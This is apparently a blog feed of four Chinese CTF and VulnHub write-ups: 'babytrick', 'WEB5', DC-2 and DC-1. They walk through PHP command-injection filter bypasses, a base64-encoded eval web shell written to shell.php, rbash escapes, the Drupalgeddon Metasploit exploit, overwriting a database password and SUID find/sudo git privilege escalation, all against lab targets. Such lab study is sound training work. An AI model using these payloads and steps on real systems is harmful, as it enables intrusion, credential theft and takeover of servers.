      <title>竞赛课-babytrick</title>
      <link href="/2022/04/16/%E7%AB%9E%E8%B5%9B%E8%AF%BE-babytrick/"/>
      <url>/2022/04/16/%E7%AB%9E%E8%B5%9B%E8%AF%BE-babytrick/</url>
      
        <content type="html"><![CDATA[<p>看看源码是什么先</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">your</span> <span class="title">baby</span> <span class="title">trick</span> <span class="title">bypass</span> <span class="title">me</span> &lt;?<span class="title">php</span></span><br><span class="line">    <span class="title">echo</span> &quot;<span class="title">use</span> <span class="title">your</span> <span class="title">baby</span> <span class="title">trick</span> <span class="title">bypass</span> <span class="title">me</span>&quot;;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_error&quot;</span>, <span class="literal">false</span>); </span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line">    <span class="variable">$str</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;O_O&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;O_O&#x27;</span>]:<span class="string">&#x27;O_O&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>], <span class="string">&quot;O_O&quot;</span>) !==<span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;O_O, baby&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span> (<span class="variable">$str</span>&lt;<span class="number">9999999999</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;too small&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span> ((<span class="keyword">string</span>)<span class="variable">$str</span>&gt;<span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;too big&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$num</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>])?<span class="variable">$_GET</span> [<span class="string">&#x27;num&#x27;</span>]:<span class="string">&#x27;num&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$num</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;no num&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable">$num</span>) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span> :</span><br><span class="line">                <span class="keyword">break</span>;  </span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span> :</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span> :</span><br><span class="line">                <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;secret.php&#x27;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span> :</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;2333333&quot;</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span> too small</span><br></pre></td></tr></table></figure><p>好！先是一个_的问题，这里直接用空格或者是%0a就能替换掉，这样第一个就过了。<br>其次就是一个数字大小判断的问题，这里用数组进行绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?O O[]=9999999999</span><br></pre></td></tr></table></figure><p>num的要求是2，但不能是数字</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">num=2a</span><br></pre></td></tr></table></figure><p>f12查看源码，发现多了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?php</span><br><span class="line">    <span class="string">&quot;my secret is in f35cdaa4e8672a43e73aee7c2dd51731, try to get it&quot;</span>;</span><br><span class="line">?</span><br></pre></td></tr></table></figure><p>访问f35cdaa4e8672a43e73aee7c2dd51731.php</p><p><img src="/2022/04/16/%E7%AB%9E%E8%B5%9B%E8%AF%BE-babytrick/1.png" alt="img"></p><p>绕过问题<br>看看有什么</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=<span class="built_in">ls</span></span><br></pre></td></tr></table></figure><p><img src="/2022/04/16/%E7%AB%9E%E8%B5%9B%E8%AF%BE-babytrick/2.png" alt="img"></p><p>抓个当前的php看看先，这里过滤了cat，php，我们用tac</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=<span class="built_in">tac</span><span class="variable">$&#123;IFS&#125;</span>f35cdaa4e8672a43e73aee7c2dd51731.p<span class="string">&quot;&quot;</span>hp</span><br></pre></td></tr></table></figure><p>这样就ok啦，整理下返回的内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^.*php.*$|^.*echo.*$|^.*cat.*$|^.*busybox.*$|[A-Z0-9a-z].*&gt;[A-Za-z0-9]|[A-Z0-9a-z].*&gt;&gt;[A-Za-z0-9]|[A-Z0-9a-z].*&gt;&amp;[A-Za-z0-9]|^.*rm.*$/i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123; <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大概就是这个样子了<br>构造我们的payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?cmd=%0als /</span><br><span class="line">?cmd=%0atac /flag</span><br></pre></td></tr></table></figure><p>这样就能拿到flag了</p><p><img src="/2022/04/16/%E7%AB%9E%E8%B5%9B%E8%AF%BE-babytrick/3.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 实践 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 绕过 </tag>
            
            <tag> 命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-2</title>
      <link href="/2022/04/15/DC-2/"/>
      <url>/2022/04/15/DC-2/</url>
      
        <content type="html"><![CDATA[<p>渗透环境: DC-2  <a href="https://www.vulnhub.com/entry/dc-2,311/">https://www.vulnhub.com/entry/dc-2,311/</a><br>攻击机：192.168.168.128<br>靶机：靶机：ip地址未知, 已知ip与攻击机在同一网段下</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><h3 id="使用nmap扫描存活的主机"><a href="#使用nmap扫描存活的主机" class="headerlink" title="使用nmap扫描存活的主机"></a>使用nmap扫描存活的主机</h3><p>老规矩上nmap</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">namp -sP 192.168.168.0/24</span><br></pre></td></tr></table></figure><p><img src="/2022/04/15/DC-2/1.png" alt="img"></p><p>发现靶机IP为192.168.168.129</p><h3 id="扫描目标主机对外开放的端口"><a href="#扫描目标主机对外开放的端口" class="headerlink" title="扫描目标主机对外开放的端口"></a>扫描目标主机对外开放的端口</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">namp -sS -p- 192.168.168.129</span><br></pre></td></tr></table></figure><p><img src="/2022/04/15/DC-2/2.png" alt="img"></p><p>发现开启了端口80<br>还有一个7744，这啥端口啊，对着这个端口再扫一次</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p 7744 192.168.168.129</span><br></pre></td></tr></table></figure><p><img src="/2022/04/15/DC-2/2.6.png" alt="img"></p><p>原来是ssh呢，先不管吧<br>浏览192.168.168.129:80</p><p><img src="/2022/04/15/DC-2/2.5.png" alt="img"></p><p>发现flag1</p><p><img src="/2022/04/15/DC-2/3.png" alt="img"></p><h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p>查看cms是什么</p><p><img src="/2022/04/15/DC-2/4.png" alt="img"></p><p>好家伙是wordpress，而且还是4.7的<br>用dirsearch看看目录下有什么</p><p><img src="/2022/04/15/DC-2/5.png" alt="img"></p><h2 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h2><p>进入后台吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://dc-2/wp-login.php?redirect_to=http%3A%2F%2F192.168.168.129%2Fwp-admin%2F&amp;reauth=1</span><br></pre></td></tr></table></figure><p><img src="/2022/04/15/DC-2/6.png" alt="img"></p><p>经典登录框<br>既然是WordPress，那就用wpscan看看有什么用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo wpscan --url http://dc-2/ –enumerate u </span><br></pre></td></tr></table></figure><p>发现以下三个user</p><p><img src="/2022/04/15/DC-2/7.png" alt="img"></p><p>放到burp上进行爆破看看，结果失败了，看来原字典中没有匹配的。<br>flag1中有说到cewl，那就用cewl生成字典再试试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl http://dc-2/ &gt; dc-2.txt</span><br></pre></td></tr></table></figure><p>用生成的dc-2.txt作为字典再跑一次（集束炸弹）</p><p><img src="/2022/04/15/DC-2/8.png" alt="img"></p><p>登录看看</p><p><img src="/2022/04/15/DC-2/9.png" alt="img"></p><p>flag2 get</p><h3 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h3><p>这里让我们找其他突破口，看了这个wordpress没用了<br>试着上传，结果跟我说路径创不了，好吧</p><p>回到之前收集到的7744端口，这就是其他突破口，ssh远程连接<br>这里我用xshell连接</p><p><img src="/2022/04/15/DC-2/10.png" alt="img"></p><p>配好后用刚刚得到的两串账号密码登录看看行不行<br>我用tom的是可以的<br>进去后发现不能用很多命令，存在命令受限问题<br>ls ，vi 能用。<br>ls，发现当前目录存在flag3.txt，用vi查看</p><p><img src="/2022/04/15/DC-2/11.png" alt="img"></p><h3 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h3><p>我这里用了vi绕过受限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vi</span><br><span class="line">:<span class="built_in">set</span> shell=/bin/bash</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure><p>发现能用cd了<br>看看有什么敏感目录吧<br>最后在&#x2F;home&#x2F;jerryx下发现flag4.txt</p><p><img src="/2022/04/15/DC-2/12.png" alt="img"></p><h3 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h3><p>git提权是吧<br>结果发现git不给用，还是得解决命令受限问题<br>最后找到了这种，rbash绕过<br>参考(<a href="https://xz.aliyun.com/t/7642#toc-3">https://xz.aliyun.com/t/7642#toc-3</a>)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span></span><br></pre></td></tr></table></figure><p><img src="/2022/04/15/DC-2/13.png" alt="img"></p><p>这里我们要改两个地方，其中是PATH与SHELL</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/bin/:/usr/bin:<span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">export</span> SHELL=/bin/sh</span><br></pre></td></tr></table></figure><p>这样我们就能用其他命令了<br>发现tom不是sudoer，那就切成jerry</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo git -p <span class="built_in">help</span></span><br><span class="line">:!/bin/bash</span><br></pre></td></tr></table></figure><p>提权成功<br>查看&#x2F;root<br>发现最后的flag</p><p><img src="/2022/04/15/DC-2/14.png" alt="img"></p><p>DC2 clear</p>]]></content>
      
      
      <categories>
          
          <category> 实践 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>竞赛课-WEB5</title>
      <link href="/2022/04/15/%E7%AB%9E%E8%B5%9B%E8%AF%BE-WEB5/"/>
      <url>/2022/04/15/%E7%AB%9E%E8%B5%9B%E8%AF%BE-WEB5/</url>
      
        <content type="html"><![CDATA[<p>有一说一，这道题的难度本来没这么高的，直到把flag放到了根目录下。自己挖的坑自己要埋上</p><p>先看题目说了什么</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$res</span> = FALSE;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">    <span class="variable">$m</span> = [];</span><br><span class="line">    <span class="keyword">if</span> (!preg_match_all(<span class="string">&quot;/(\||&amp;|;| |\/|cat|flag|php)/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">        <span class="variable">$cmd</span> = <span class="string">&quot;ping -c 4 &#123;<span class="variable">$ip</span>&#125;&quot;</span>;</span><br><span class="line">        <span class="variable">$a</span> = <span class="built_in">exec</span>(<span class="variable">$cmd</span>, <span class="variable">$res</span>);</span><br><span class="line">        print_r(<span class="variable">$a</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="variable">$m</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>emmm, 总之就是过滤了’|’, ‘&amp;’, ‘; ‘, ‘空格’，’&#x2F;‘, ‘cat’, ‘flag’, ‘php’<br>先是过滤了分号的问题，我们可以用%0a绕过这个（%0a换行）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=%0als</span><br></pre></td></tr></table></figure><p><img src="/2022/04/15/%E7%AB%9E%E8%B5%9B%E8%AF%BE-WEB5/1.png" alt="img"></p><p>好！什么也没看出来<br>考虑上马，这里选择用base64对一句话木马进行加密<br>原型</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;attack&#x27;</span>]);?&gt;</span><br></pre></td></tr></table></figure><p>base64后</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAgQGV2YWwoJF9QT1NUWydhdHRhY2snXSk7Pz4=</span><br></pre></td></tr></table></figure><p>因为它ban了很多重要的符号，我们就先将base64后的放到txt文件中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=%0aecho<span class="variable">$&#123;IFS&#125;</span><span class="string">&quot;PD9waHAgQGV2YWwoJF9QT1NUWydhdHRhY2snXSk7Pz4=&quot;</span>&gt;base64.txt</span><br></pre></td></tr></table></figure><p>访问base64.txt</p><p><img src="/2022/04/15/%E7%AB%9E%E8%B5%9B%E8%AF%BE-WEB5/2.png" alt="img"></p><p>OK, 下面就把它解密放到php文件中，这里我用拼接的方法绕过php过滤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=%0aa=p%0ab=hp%0abase64<span class="variable">$&#123;IFS&#125;</span>-d<span class="variable">$&#123;IFS&#125;</span>base64.txt&gt;shell.$a<span class="variable">$b</span></span><br></pre></td></tr></table></figure><p>用蚁剑进行连接</p><p><img src="/2022/04/15/%E7%AB%9E%E8%B5%9B%E8%AF%BE-WEB5/3.png" alt="img"></p><p>成功连接后访问根目录</p><p><img src="/2022/04/15/%E7%AB%9E%E8%B5%9B%E8%AF%BE-WEB5/4.png" alt="img"></p><p>获得flag</p>]]></content>
      
      
      <categories>
          
          <category> 实践 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
            <tag> 绕过 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透-DC1</title>
      <link href="/2022/04/15/DC-1/"/>
      <url>/2022/04/15/DC-1/</url>
      
        <content type="html"><![CDATA[<p>渗透环境：DC1<br>攻击机：192.168.138.128<br>靶机：ip地址未知, 已知ip与攻击机在同一网段下</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>靶机环境：<a href="https://www.vulnhub.com/entry/dc-1,292/">https://www.vulnhub.com/entry/dc-1,292/</a></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="使用nmap扫描存活的主机"><a href="#使用nmap扫描存活的主机" class="headerlink" title="使用nmap扫描存活的主机"></a>使用nmap扫描存活的主机</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap  -sP 192.168.138.0/24</span><br></pre></td></tr></table></figure><p><img src="/2022/04/15/DC-1/1.png" alt="img"></p><p>192.168.178.129：目标主机</p><h3 id="扫描目标主机对外开放的端口"><a href="#扫描目标主机对外开放的端口" class="headerlink" title="扫描目标主机对外开放的端口"></a>扫描目标主机对外开放的端口</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">namp -sS -p- 192.168.178.129</span><br></pre></td></tr></table></figure><p><img src="/2022/04/15/DC-1/2.png" alt="img"></p><p>发现开启了端口80<br>浏览192.168.178.129:80</p><p><img src="/2022/04/15/DC-1/3.png" alt="img"></p><p>查看Wappalyzer</p><p><img src="/2022/04/15/DC-1/4.png" alt="img"></p><p>发现cms为Drupal，这版本有点low，估计有漏洞</p><h2 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h2><h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p>使用msf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search drupal</span><br></pre></td></tr></table></figure><p><img src="/2022/04/15/DC-1/5.png" alt="img"></p><p>这里我们选择exploit&#x2F;multi&#x2F;http&#x2F;drupal_drupageddon</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use 2</span><br><span class="line">options//查看需要设置的参数</span><br><span class="line"><span class="built_in">set</span> RHOSTS 192.168.178.129//设置目标ip</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>成功后我们执行ls，查看当前目录</p><p><img src="/2022/04/15/DC-1/6.png" alt="img"></p><p>发现flag1.txt，打开查看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> flag1.txt</span><br></pre></td></tr></table></figure><p><img src="/2022/04/15/DC-1/7.png" alt="img"></p><h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p>到这里，上传个一句话木马看看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload /data/shell.php</span><br></pre></td></tr></table></figure><p>用蚁剑进行连接</p><p><img src="/2022/04/15/DC-1/8.png" alt="img"></p><p>找找第二个flag在哪<br>最后发现在settings.php中</p><p><img src="/2022/04/15/DC-1/9.png" alt="img"></p><h3 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h3><p>里面还有数据库的账号密码，也发现是mysql<br>在msf上传个交互shell, 然后连接mysql</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">mysql -u dbuser -p </span><br><span class="line">R0ck3t</span><br></pre></td></tr></table></figure><p>然后就常规的，查库，查表，查列，爆内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">show databases; </span><br><span class="line">use drupaldb; </span><br><span class="line">show tables; </span><br><span class="line">select * from <span class="built_in">users</span>; </span><br></pre></td></tr></table></figure><p><img src="/2022/04/15/DC-1/10.png" alt="img"></p><p>这里admin的密码被加密了，我们选择update的方式改为我们知道的密码<br>其中drupal可以通过password-hash.sh生成新的密码<br>我们在www目录执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php scripts/password-hash.sh admin</span><br></pre></td></tr></table></figure><p><img src="/2022/04/15/DC-1/11.png" alt="img"></p><p>sql中的替换语句</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update <span class="built_in">users</span> <span class="built_in">set</span> pass=<span class="string">&#x27;$S$DtPgSa61SbR1DXIh4wWcMft/rOmsKXcgvxTUAgenIMRbH65ZUAZu&#x27;</span> <span class="built_in">where</span> name=<span class="string">&#x27;admin&#x27;</span>;</span><br></pre></td></tr></table></figure><p>用账号：admin 密码：admin ，登录192.168.178.129:80查看里面信息</p><p><img src="/2022/04/15/DC-1/12.png" alt="img"></p><h3 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h3><p>在home目录下发现flag4.txt</p><p><img src="/2022/04/15/DC-1/13.png" alt="img"></p><h3 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h3><p>所以我们要提权到root，这里我们用find提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="/2022/04/15/DC-1/14.png" alt="img"></p><p>发现find能利用<br>在&#x2F;tmp目录下创建command文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">touch</span> <span class="built_in">command</span></span><br><span class="line">find <span class="built_in">command</span> -<span class="built_in">exec</span> <span class="built_in">whoami</span> \;</span><br></pre></td></tr></table></figure><p><img src="/2022/04/15/DC-1/15.png" alt="img"></p><p>发现获得root权限了<br>修改命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find <span class="built_in">command</span> -<span class="built_in">exec</span> <span class="built_in">ls</span> /root \; </span><br><span class="line">find <span class="built_in">command</span> -<span class="built_in">exec</span> <span class="built_in">cat</span> /root/thefinalflag.txt \; </span><br></pre></td></tr></table></figure><p><img src="/2022/04/15/DC-1/16.png" alt="img"></p><p>到处为止DC-1完成</p>]]></content>
      
      
      <categories>
          
          <category> 实践 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
